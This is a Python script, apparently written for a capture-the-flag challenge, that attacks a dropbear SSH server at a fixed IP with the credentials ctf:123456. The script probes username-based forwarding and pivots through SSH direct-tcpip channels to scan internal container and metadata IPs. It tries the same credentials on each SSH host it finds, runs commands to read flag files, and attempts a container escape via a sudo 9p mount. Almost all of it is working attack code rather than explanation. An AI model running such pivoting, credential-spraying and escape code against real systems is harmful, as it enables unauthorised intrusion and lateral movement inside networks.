#!/usr/bin/env python3
"""
新思路：利用用户名格式触发到真实主机的转发
关键点：如果dropbear会将user@host格式的用户名转发到host
我们需要找到一个接受已知凭据的host
"""

import socket
import paramiko
import time
import sys

HOST = "61.147.171.105"
PORT = 55300

def raw_analyze_username_forwarding():
    """
    使用原始socket分析用户名导致的转发行为
    """
    print("=" * 70)
    print("[*] 原始协议分析：用户名触发的转发")
    print("=" * 70)
    
    def test_connection(username, password="123456"):
        """测试特定用户名的连接行为"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        
        try:
            sock.connect((HOST, PORT))
            
            # 读取banner
            banner = b""
            while b"\r\n" not in banner:
                chunk = sock.recv(1)
                if not chunk:
                    return ("closed", "No banner")
                banner += chunk
            
            banner_str = banner.decode().strip()
            
            # 发送客户端版本
            sock.send(b"SSH-2.0-test\r\n")
            
            # 读取KEX_INIT
            try:
                kex = sock.recv(4096)
                if len(kex) == 0:
                    return ("closed", "KEX empty")
                return ("open", banner_str, len(kex))
            except:
                return ("closed", "KEX timeout")
            
        except Exception as e:
            return ("error", str(e))
        finally:
            sock.close()
    
    # 测试不同的用户名
    print("\n测试用户名格式对连接的影响：")
    print("-" * 50)
    
    results = {}
    test_usernames = [
        "ctf",              # 正常
        "ctf@",             # 空目标
        "@ctf",             # 空用户
        "ctf@localhost",    # localhost
        "ctf@127.0.0.1",    # loopback
        "ctf@172.17.0.1",   # 真实Ubuntu
        "ctf@10.42.0.1",    # 另一个Ubuntu IP
        "ctf@invalid",      # 无效主机
        "ctf@1.2.3.4",      # 不可达IP
    ]
    
    for username in test_usernames:
        result = test_connection(username)
        print(f"  {username:25} => {result[0]}")
        results[username] = result
    
    return results

def understand_the_trick():
    """
    理解攻击技巧
    
    FakeJumpServer的核心思想：
    1. 用户以为连接到服务器A
    2. 实际上服务器A是一个代理，会把连接转发到服务器B
    3. 用户在"服务器A"上输入的密码被用于认证服务器B
    
    在这个题目中：
    - dropbear是FakeJumpServer
    - 当使用user@host格式时，dropbear尝试转发到host
    - 问题是：所有目标主机都不接受ctf:123456
    
    但是！用户提示说"第二次SSH连接的错误是有用的"
    这意味着：
    - 当转发失败时，错误信息可能泄露了某些东西
    - 或者我们需要利用失败的认证来做些什么
    
    另一个思路：
    - 如果转发到的是一个不需要认证的服务会怎样？
    - 或者转发到一个会回显凭据的服务？
    """
    print("\n" + "=" * 70)
    print("[*] 分析可能的攻击向量")
    print("=" * 70)
    
    print("""
    场景分析：
    ---------
    1. dropbear在收到user@host格式的用户名时，会尝试连接host:22
    2. 如果host是localhost或127.0.0.1，连接会回到dropbear自己
    3. 但即使这样，为什么认证会失败？
    
    可能的原因：
    - dropbear在转发模式下不使用密码认证
    - 或者dropbear在转发时使用不同的凭据
    - 或者这是一个bug/限制
    
    新思路：
    -------
    既然direct-tcpip可以工作，而用户名格式不行，
    问题可能在于：
    - direct-tcpip是在认证后建立的
    - 用户名格式是在认证前处理的
    
    这意味着dropbear可能在处理用户名时触发转发，
    然后尝试用相同的凭据认证目标...
    
    但等等！如果目标是localhost，而localhost被fake到dropbear自己，
    那么这会形成一个循环！
    
    这可能就是连接被关闭的原因！
    """)

def test_non_ssh_forwarding():
    """
    测试：用户名格式是否能触发到非SSH端口的转发？
    """
    print("\n" + "=" * 70)
    print("[*] 测试非SSH端口转发")
    print("=" * 70)
    
    # 如果user@host:port格式可以指定端口...
    test_patterns = [
        "ctf@172.17.0.2:80",      # Rancher metadata
        "ctf@localhost:80",
        "ctf@127.0.0.1:8080",
        "ctf@[172.17.0.2]",
        "ctf@172.17.0.2",
    ]
    
    for pattern in test_patterns:
        print(f"\n测试: {pattern}")
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(HOST, PORT, username=pattern, password="123456", timeout=5)
            print("  连接成功!")
            
            # 检查实际连接到了哪里
            transport = client.get_transport()
            key = transport.get_remote_server_key()
            fingerprint = key.get_fingerprint().hex()
            print(f"  Host Key: {fingerprint}")
            
            client.close()
        except paramiko.SSHException as e:
            if "banner" in str(e).lower():
                print(f"  连接被关闭（转发触发）")
            else:
                print(f"  SSH错误: {e}")
        except Exception as e:
            print(f"  错误: {e}")

def scan_for_accessible_ssh():
    """
    扫描可能接受ctf:123456的SSH服务
    """
    print("\n" + "=" * 70)
    print("[*] 扫描可能接受ctf:123456的内部SSH")
    print("=" * 70)
    
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(HOST, PORT, "ctf", "123456")
    transport = client.get_transport()
    
    # 扫描更广泛的IP范围
    targets = []
    
    # 从Rancher metadata发现的IP
    known_ips = [
        "10.42.111.62",   # 当前容器
        "10.42.227.103",  # 另一个verygoodssh实例
        "10.42.134.84",   # 从services发现
        "172.17.0.2",     # metadata
        "172.17.0.1",     # host
        "10.42.0.1",      # gateway
        "10.30.49.12",    # agent_ip
        "10.30.49.14",    # 另一个agent
    ]
    
    print("\n检查已知IP的SSH服务...")
    for ip in known_ips:
        try:
            chan = transport.open_channel(
                "direct-tcpip",
                (ip, 22),
                ("127.0.0.1", 0)
            )
            chan.settimeout(3)
            banner = chan.recv(1024).decode()
            if "SSH" in banner:
                targets.append((ip, banner.strip()))
                print(f"  [+] {ip}:22 - {banner[:40].strip()}")
            chan.close()
        except:
            pass
    
    print(f"\n找到 {len(targets)} 个SSH服务")
    
    # 尝试认证
    print("\n尝试ctf:123456认证...")
    for ip, banner in targets:
        try:
            chan = transport.open_channel(
                "direct-tcpip",
                (ip, 22),
                ("127.0.0.1", 0)
            )
            
            inner = paramiko.SSHClient()
            inner.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            inner.connect(ip, username="ctf", password="123456", sock=chan, timeout=5)
            
            print(f"\n  [!!!] {ip} - 认证成功!")
            
            # 执行命令
            stdin, stdout, stderr = inner.exec_command("id; cat /flag* 2>/dev/null; ls -la / 2>/dev/null")
            output = stdout.read().decode()
            error = stderr.read().decode()
            print(f"  stdout: {output[:300]}")
            print(f"  stderr: {error[:100]}")
            
            inner.close()
        except paramiko.AuthenticationException:
            pass
        except Exception as e:
            if "Auth" not in str(e) and "banner" not in str(e).lower():
                print(f"  {ip} - {e}")
    
    client.close()

def test_container_escape():
    """
    容器逃逸测试
    
    回顾用户提示：
    - "逃出SSH容器读取flag"
    - "使用 sudo mount -t 9p -o trans=virtio,version=9p2000.L flag /mnt"
    
    这意味着需要：
    1. 获得宿主机访问权限
    2. 使用9p文件系统挂载flag
    
    9p是用于虚拟机/容器与宿主机共享文件的协议
    这暗示容器是qemu/kvm虚拟机或有virtio设备
    """
    print("\n" + "=" * 70)
    print("[*] 容器逃逸相关测试")
    print("=" * 70)
    
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(HOST, PORT, "ctf", "123456")
    
    print("\n[1] 检查设备和挂载点...")
    commands = [
        "ls -la /dev/vport* /dev/virtio* 2>/dev/null",
        "cat /proc/filesystems | grep 9p",
        "mount | grep 9p",
        "ls -la /sys/bus/virtio/devices/ 2>/dev/null",
        "cat /proc/cmdline 2>/dev/null",
        "dmesg 2>/dev/null | grep -i 9p | head -5",
    ]
    
    for cmd in commands:
        print(f"\n$ {cmd}")
        try:
            stdin, stdout, stderr = client.exec_command(cmd)
            output = stdout.read().decode()
            error = stderr.read().decode()
            if output:
                print(f"  {output[:200]}")
            if error and "busy" not in error.lower():
                print(f"  (stderr) {error[:100]}")
        except Exception as e:
            print(f"  错误: {e}")
    
    print("\n[2] 尝试9p挂载（需要sudo/root）...")
    mount_cmds = [
        "sudo mount -t 9p -o trans=virtio,version=9p2000.L flag /mnt 2>&1",
        "mount -t 9p -o trans=virtio,version=9p2000.L flag /mnt 2>&1",
        "ls -la /mnt 2>&1",
    ]
    
    for cmd in mount_cmds:
        print(f"\n$ {cmd}")
        try:
            stdin, stdout, stderr = client.exec_command(cmd)
            output = stdout.read().decode()
            error = stderr.read().decode()
            print(f"  stdout: {output[:200] if output else '(empty)'}")
            print(f"  stderr: {error[:200] if error else '(empty)'}")
        except Exception as e:
            print(f"  错误: {e}")
    
    client.close()

if __name__ == "__main__":
    # raw_analyze_username_forwarding()
    understand_the_trick()
    # test_non_ssh_forwarding()
    scan_for_accessible_ssh()
    test_container_escape()
